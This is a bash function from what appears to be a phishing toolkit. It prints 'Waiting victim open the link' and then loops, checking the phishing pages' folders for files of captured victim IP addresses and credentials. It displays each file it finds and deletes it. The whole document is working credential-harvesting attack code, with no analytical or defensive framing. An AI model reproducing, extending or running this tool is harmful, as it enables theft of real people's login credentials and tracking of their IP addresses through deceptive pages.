
checkfound() {
    printf "\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
    while [ true ]; do
        if [[ -e "../../webpages/$server/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
            catch_ip
            rm -rf ../../webpages/$server/ip.txt
        fi
            sleep 0.5
            if [[ -e "../../webpages/$server/usernames.txt" ]]; then
                printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                catch_cred
                rm -rf ../../webpages/$server/usernames.txt
                fi
                if [[ -e "../../webpages/$server/saved.ip.txt" ]]; then
                    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
                    catch_ip
                    rm -rf ../../webpages/$server/saved.ip.txt
                fi
                    sleep 0.5
                    if [[ -e "../../webpages/$server/saved.usernames.txt" ]]; then
                        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                        catch_cred
                        rm -rf ../../webpages/$server/saved.usernames.txt
                    fi
                        sleep 0.5
                        done
}